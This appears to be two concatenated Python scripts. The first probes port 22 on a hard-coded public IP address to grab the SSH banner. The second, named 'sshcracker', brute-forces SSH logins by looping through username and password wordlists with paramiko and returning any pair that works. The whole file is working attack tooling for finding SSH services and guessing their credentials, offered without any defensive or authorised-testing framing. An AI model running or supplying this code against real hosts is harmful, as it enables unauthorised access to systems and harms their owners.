from asyncio import wait_for, TimeoutError, open_connection, run


async def check_ssh_open(ip: str):
    try:
        reader, writer = await wait_for(open_connection(ip, 22), 2)
    except (TimeoutError, OSError) as e:
        return "SSH service is not open."

    try:
        s = await wait_for(reader.readuntil(b"\n"), 3)
        # print(s)
        s = s.decode()
        if s.startswith("SSH"):
            return f"{ip} -> {s.strip()}"
            # return ip, s.strip()
    except TimeoutError as e:
        pass
    finally:
        writer.close()
    return False


async def main():
    print(await check_ssh_open("8.129.1.143"))


if __name__ == '__main__':
    run(main())




# -*- coding: utf-8 -*-

import paramiko
import time
import signal

username_list = []
password_list = []


def get_username_list():
    global username_list
    if not username_list:
        f = open('username.txt', 'r', encoding='utf-8')
        for item in f.readlines():
            item = item.strip()
            if item and not item.startswith('#'):
                username_list.append(item)
        f.close()
    return username_list


def get_password_list():
    global password_list
    if not password_list:
        f = open('passwords.txt', 'r', encoding='utf-8')
        for item in f.readlines():
            item = item.strip()
            if item and not item.startswith('#'):
                password_list.append(item)
        f.close()
    return password_list


def sshcracker(ip):
    username_list = get_username_list()
    password_list = get_password_list()
    flag = False
    for username in username_list:
        for password in password_list:
            try:
                print(f"{username}:{password}")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                ssh.connect(ip, 22, username, password)
                return f"username is: {username}, password is: {password}"
                flag = True
                ssh.close()
                break
            except Exception as e:
                pass
            except KeyboardInterrupt:
                pass

            time.sleep(1)
        if flag == True:
            break
    if flag == False:
        return "The username and password is not weak."


if __name__ == '__main__':
    ip = input()
    y = sshcracker(ip)
    print(y)

